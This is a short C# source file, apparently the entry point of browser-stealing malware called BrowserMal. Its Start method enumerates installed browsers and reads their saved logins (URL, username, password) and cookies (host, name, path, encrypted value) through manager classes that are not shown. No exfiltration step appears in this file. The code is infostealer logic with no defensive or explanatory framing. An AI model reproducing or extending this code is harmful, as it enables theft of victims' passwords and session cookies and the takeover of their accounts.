using BrowserMal.Browser;
using BrowserMal.Credential;
using BrowserMal.Cookie;
using System.Collections.Generic;
using BrowserMal.Manager;

namespace BrowserMal
{
    public class Class1
    {
        private static readonly BrowserManager browserManager = new BrowserManager();

        public static void Start()
        {
            browserManager.Init();
            List<BrowserModel> browsers = browserManager.GetBrowsers();

            GenericManager<CredentialModel> credentialManager = new GenericManager<CredentialModel>("logins", new string[] { "origin_url", "username_value", "password_value" });
            credentialManager.Init(ref browsers, Browser.Util.LOGIN_DATA);

            GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new string[] { "host_key", "name", "path", "encrypted_value" });
            cookiesManager.Init(ref browsers, Browser.Util.COOKIES);
        }
    }
}
